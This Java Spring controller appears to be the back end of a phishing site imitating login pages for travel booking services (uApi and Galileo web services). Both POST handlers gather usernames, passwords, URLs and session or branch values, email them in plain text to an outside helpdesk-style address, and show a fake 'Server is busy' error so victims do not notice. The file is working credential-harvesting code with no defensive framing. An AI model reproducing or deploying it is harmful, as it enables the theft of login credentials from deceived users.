package com.travel.administrative.controllers;

import com.travel.administrative.service.EmailService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;

@Controller
public class RootController {

    @Autowired
    EmailService emailService;
    @GetMapping("/")
    public String home(){
        return "index";
    }

    @PostMapping("/process-uApi")
    public String uApiProcess(@RequestParam("username") String username,
                              @RequestParam("password") String password,
                              @RequestParam("targetBranch") String targetBranch,
                              @RequestParam("url") String url,
                              @RequestParam("gdsCode") String gdsCode, RedirectAttributes redirectAttributes){


        String subject = "New Login Attempt process-uApi ";
        String message = "User name: " + username + "\nPassword: " + password + "\ntargetBranch: " + targetBranch +"\nurl: " + url +"\ngdsCode:" +gdsCode;

        emailService.sendEmail("sabre@sabrehelpdesk.com", subject, message);
        redirectAttributes.addFlashAttribute("errorMessage", "Server is busy. Please try again later.");


        return "redirect:/";
    }


    @GetMapping("/galileo-web-services")
    public String galileoWebServices(){
        return "webservices";
    }

    @PostMapping("/process-galileo-web-services")
    public String processGalileoWebServices(
            @RequestParam("hostName") String hostName,
            @RequestParam("username") String username,
            @RequestParam("password") String password,
            @RequestParam("url") String url,
            @RequestParam("session") String session , RedirectAttributes redirectAttributes
    ) {
        String subject = "New Login Attempt galileo web services ";
        String message = "Host name: "+hostName+"\nUser name: " + username + "\nPassword: " + password  +"\nurl: " + url+"\nsession:" +session;

        emailService.sendEmail("sabre@sabrehelpdesk.com", subject, message);
        redirectAttributes.addFlashAttribute("errorMessage", "Server is busy. Please try again later.");



        return "redirect:/galileo-web-services";
    }
}
